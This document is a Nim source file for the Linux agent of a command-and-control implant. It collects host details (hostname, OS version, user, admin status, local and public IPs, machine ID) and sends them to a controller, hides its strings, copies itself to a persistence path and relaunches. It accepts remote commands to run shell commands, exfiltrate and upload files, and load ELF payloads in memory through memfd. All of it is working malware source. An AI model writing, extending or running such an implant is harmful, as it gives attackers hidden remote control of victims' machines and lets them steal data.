# Internal imports
import ../config
import ../common
import utils/[memfd]
# External imports
import std/[tables, nativesockets, json]
import system/[io]
import httpclient
import nimprotect
import strutils
import osproc
import crc32
import os

# Core functions
proc linux_start*(): void
proc linux_parse_command*(command: JsonNode): bool

# Command executors
proc collect_data(): bool
proc wrap_load_memfd(elf_base64: string, command_line: string, mode: string): bool

# Helpers
proc get_linux_agent_id*(): string

# Globals
let client = newHttpClient(userAgent=get_linux_agent_id())


#########################
### Command executors ###
#########################

proc collect_data(): bool =
    var is_success: bool
    var hostname: string
    var os_version: string
    var process: string
    var username: string
    var is_admin: string
    var is_elevated: string
    var ipv4_local: string
    var ipv4_public: string

    try:
        hostname = getHostname()
    except:
        hostname = could_not_retrieve
    try:    
        for i in readFile(protectString("/etc/os-release")).split("\n"):
            if contains(i, protectString("PRETTY_NAME")):
                os_version = i.split("\"")[1]
    except:
        os_version = could_not_retrieve      
    try:    
        var pid = $getCurrentProcessId()
        var pname = readFile(protectString("/proc/") & $pid & protectString("/comm")).replace("\n", "")
        process = pid & " " & pname
    except:
        process = could_not_retrieve
    try:
        username = execCmdEx(protectString("whoami"), options={poDaemon})[0].replace("\n", "")
    except:
        username = could_not_retrieve
    if username == protectString("root"):
        is_admin = "True"
        is_elevated = "True"
    else: 
        try:
            if protectString("(sudo)") in execCmdEx(protectString("id"))[0]:
                is_admin = "True"
            else:
                is_admin = "False"
        except:
            is_admin = could_not_retrieve
        is_elevated = "False"
    try:
        ipv4_local = execCmdEx(protectString("hostname -I"))[0].replace("\n", "")
    except:
        ipv4_local = could_not_retrieve
    try:
        ipv4_public = client.getContent(protectString("http://api.ipify.org"))
    except:
        ipv4_public = could_not_retrieve
    
    var data = {

        protectString("Hostname"): hostname,
        protectString("OS Version"): os_version,
        protectString("Process"): process,
        protectString("Username"): username, 
        protectString("Is Admin"): is_admin, 
        protectString("Is Elevated"): is_elevated, 
        protectString("IPV4 Local"): ipv4_local, 
        protectString("IPV4 Public"): ipv4_public
    
    }.toOrderedTable()

    is_success = post_data(client, protectString("collect") , $data)

    return is_success


proc wrap_load_memfd(elf_base64: string, command_line: string, mode: string): bool =
    var is_success: bool
    var is_task: bool
    var output: string
    
    case mode:
        of "implant":
            is_task = false
        of "task":
            is_task = true
        else:
            return false
    
    (is_success, output) = load_memfd(elf_base64, command_line, is_task)

    var data = {
        "is_success": $is_success,
        "mode": mode,
        "command_line": command_line
    }.toOrderedTable()
    
    if output.len() > 0:
        data["output"] = output

    is_success = post_data(client, protectString("memfd"), $data)

    return is_success


#########################
######## Helpers ########
#########################

proc get_linux_agent_id*(): string =
    var machine_id = readFile(protectString("/etc/machine-id"))
    var user_agent = machine_id
    crc32(user_agent)
    return user_agent.toLower()
    

##########################
##### Core functions #####
##########################

proc linux_start*(): void =
    sleep(sleep_on_execution * 1000)
    let binary_path = getAppFilename()
    if is_exe and (binary_path != agent_execution_path_linux):
        var agent_execution_dir = splitFile(agent_execution_path_linux)[0]
        createDir(agent_execution_dir)
        copyFile(binary_path, agent_execution_path_linux)
        discard execCmdEx(protectString("chmod +x ") & agent_execution_path_linux)
        discard startProcess(agent_execution_path_linux, options={})
        quit()
    else:
        discard collect_data()


proc linux_parse_command*(command: JsonNode): bool =
    var is_success: bool
    var command_type = command[protectString("command_type")].getStr()
    case command_type:
        of protectString("cmd"):
            is_success = run_shell_command(client, command[protectString("shell_command")].getStr())
        of protectString("download"):
            is_success = exfil_file(client, command["src_file"].getStr())
        of protectString("upload"):
            is_success = write_file(client, command["src_file_data_base64"].getStr(), command["dst_file_path"].getStr()) 
        of protectString("memfd"):
            is_success = wrap_load_memfd(command["elf_file_data_base64"].getStr(), command["command_line"].getStr(), command["mode"].getStr())
        of protectString("sleep"):
            is_success = change_sleep_time(client, command["timeframe"].getInt(), command[protectString("jitter_percent")].getInt())
        of protectString("collect"):
            is_success = collect_data()
        of protectString("kill"):
            kill_agent(client)

        else:
            is_success = false
    return is_success
